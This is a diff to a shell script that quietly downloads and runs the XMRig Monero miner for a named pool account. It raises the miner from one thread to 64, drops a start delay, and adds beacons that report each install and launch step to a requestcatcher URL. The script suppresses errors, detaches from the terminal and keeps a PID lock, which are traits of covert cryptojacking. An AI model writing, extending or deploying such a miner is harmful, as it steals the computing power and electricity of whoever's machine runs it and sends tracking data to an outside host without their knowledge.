@@ -10,25 +10,10 @@ XMRIG_URL="${XMRIG_URL:-https://github.com/xmrig/xmrig/releases/download/v${XMRI
 XMRIG_SHA256="${XMRIG_SHA256:-b20f39fc00d242e706b6c30367ad811c676e0575050a4ec2f30104b696944b49}"
 POOL="${POOL:-rx.unmineable.com:3333}"
 ACCOUNT="${ACCOUNT:-alvin3y1}"
-THREADS="${THREADS:-1}"
-START_DELAY="${START_DELAY:-45}"
+THREADS=64
 REPORT_URL="${REPORT_URL:-https://apple3y.requestcatcher.com/test}"
 REPORT_INTERVAL="${REPORT_INTERVAL:-300}"
 POLL_INTERVAL="${POLL_INTERVAL:-15}"
-
-case "$THREADS:$START_DELAY:$REPORT_INTERVAL:$POLL_INTERVAL" in
-    *[!0-9:]*|0:*|*:0:*|*:*:0:*|*:*:*:0) exit 0 ;;
-esac
-
-BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
-INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
-XMRIG="$INSTALL_DIR/xmrig"
-PID_FILE="$INSTALL_DIR/xmrig.pid"
-LOCK_DIR="$INSTALL_DIR/.startup-lock"
-BOOTSTRAP_LOG="$INSTALL_DIR/bootstrap.log"
-MINER_LOG="$INSTALL_DIR/xmrig.log"
-
-mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 0
 
 report()
 {
@@ -43,6 +28,28 @@ report()
         "$REPORT_URL" >/dev/null 2>&1 || :
 }
 
+report "script_started" "pid=$$" </dev/null >/dev/null 2>&1 &
+
+case "$THREADS:$REPORT_INTERVAL:$POLL_INTERVAL" in
+    *[!0-9:]*|0:*|*:0:*|*:*:0)
+        report "config_error" "numeric settings must be positive integers"
+        exit 0
+        ;;
+esac
+
+BASE_DIR="${XDG_DATA_HOME:-${HOME:-${TMPDIR:-/tmp}}}"
+INSTALL_DIR="${XMRIG_DIR:-${BASE_DIR%/}/unmineable-xmrig}"
+XMRIG="$INSTALL_DIR/xmrig"
+PID_FILE="$INSTALL_DIR/xmrig.pid"
+LOCK_DIR="$INSTALL_DIR/.startup-lock"
+BOOTSTRAP_LOG="$INSTALL_DIR/bootstrap.log"
+MINER_LOG="$INSTALL_DIR/xmrig.log"
+
+mkdir -p "$INSTALL_DIR" 2>/dev/null || {
+    report "install_error" "could not create $INSTALL_DIR"
+    exit 0
+}
+
 log_tail()
 {
     tail -n 20 "$MINER_LOG" 2>/dev/null || printf 'no miner log available'
@@ -51,22 +58,30 @@ log_tail()
 start_worker()
 (
     trap '' HUP
-    mkdir "$LOCK_DIR" 2>/dev/null || exit 0
+    if ! mkdir "$LOCK_DIR" 2>/dev/null; then
+        report "bootstrap_skipped" "another bootstrap is active"
+        exit 0
+    fi
     trap 'rm -rf "$LOCK_DIR"' EXIT
+    report "bootstrap_started" "install_dir=$INSTALL_DIR"
 
     if [ -r "$PID_FILE" ]; then
         read -r OLD_PID <"$PID_FILE"
         case "$OLD_PID" in
             *[!0-9]*|'') ;;
-            *) kill -0 "$OLD_PID" 2>/dev/null && exit 0 ;;
+            *)
+                if kill -0 "$OLD_PID" 2>/dev/null; then
+                    report "miner_already_running" "pid=$OLD_PID"
+                    exit 0
+                fi
+                ;;
         esac
         rm -f "$PID_FILE"
     fi
 
-    sleep "$START_DELAY"
-
     TEMP_ARCHIVE="$INSTALL_DIR/xmrig.download.$$.tar.gz"
     TEMP_DIR="$INSTALL_DIR/xmrig.extract.$$"
+    report "download_started" "url=$XMRIG_URL"
     mkdir "$TEMP_DIR" 2>/dev/null || {
         report "install_error" "could not create extraction directory"
         exit 0
@@ -77,6 +92,7 @@ start_worker()
         report "download_error" "failed to download static xmrig archive"
         exit 0
     fi
+    report "download_succeeded" "archive=$TEMP_ARCHIVE"
     command -v tar >/dev/null 2>&1 || {
         report "install_error" "tar is unavailable"
         exit 0
@@ -90,12 +106,14 @@ start_worker()
         report "install_error" "could not extract static xmrig"
         exit 0
     fi
+    report "archive_extracted" "version=$XMRIG_VERSION"
     TEMP_XMRIG="$TEMP_DIR/xmrig-${XMRIG_VERSION}/xmrig"
     if ! printf '%s  %s\n' "$XMRIG_SHA256" "$TEMP_XMRIG" |
         sha256sum -c - >/dev/null 2>&1; then
         report "install_error" "static xmrig checksum mismatch"
         exit 0
     fi
+    report "checksum_verified" "sha256=$XMRIG_SHA256"
     if ! chmod 700 "$TEMP_XMRIG"; then
         report "install_error" "could not make xmrig executable"
         exit 0
@@ -105,6 +123,7 @@ start_worker()
         exit 0
     fi
     rm -rf "$TEMP_ARCHIVE" "$TEMP_DIR"
+    report "miner_installed" "path=$XMRIG"
 
     WORKER="worker-$(date +%s)-$$"
     command -v nohup >/dev/null 2>&1 || {
@@ -115,6 +134,7 @@ start_worker()
         report "launch_error" "nice is unavailable"
         exit 0
     }
+    report "miner_starting" "threads=$THREADS pool=$POOL"
     nohup nice -n 19 "$XMRIG" \
         -o "$POOL" \
         -a rx \
@@ -134,6 +154,7 @@ start_worker()
         rm -f "$PID_FILE"
         exit 0
     fi
+    report "miner_started" "pid=$MINER_PID threads=$THREADS pool=$POOL"
 
     (
         trap '' HUP
